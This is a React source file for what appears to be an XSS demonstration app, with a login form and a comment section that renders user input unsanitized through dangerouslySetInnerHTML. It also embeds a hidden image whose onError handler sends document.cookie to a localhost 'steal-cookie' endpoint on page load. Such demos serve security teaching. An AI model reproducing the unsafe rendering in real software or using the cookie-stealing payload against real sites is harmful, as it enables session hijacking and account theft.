// frontend/src/App.js
import React, { useState } from "react";

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState([]);

  const handleLogin = async (e) => {
    e.preventDefault();
    const res = await fetch("http://localhost:4000/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include", // Send cookies with the request
      body: JSON.stringify({ username, password })
    });
    const data = await res.json();
    alert(data.message);
  };

  const postComment = () => {
    setComments([...comments, comment]);
    setComment("");
  };

  return (
    <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>
      <h1>🔥 XSS Demo - React</h1>

      <form onSubmit={handleLogin}>
        <input
          placeholder="Username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          placeholder="Password"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button type="submit">Login</button>
      </form>

      <h2>💬 Comment Section (vulnerable)</h2>
      <input
        placeholder="Type a comment"
        value={comment}
        onChange={(e) => setComment(e.target.value)}
      />
      <button onClick={postComment}>Post</button>

      <div style={{ marginTop: "1rem" }}>
        {comments.map((c, i) => (
          <p key={i} dangerouslySetInnerHTML={{ __html: c }} />
        ))}
      </div>

      {/* XSS Payload */}
      <img
        src="x"
        onError={() => {
          fetch('http://localhost:9000/steal-cookie?data=' + document.cookie);
        }}
        style={{ display: "none" }}
      />
    </div>
  );
}

export default App;
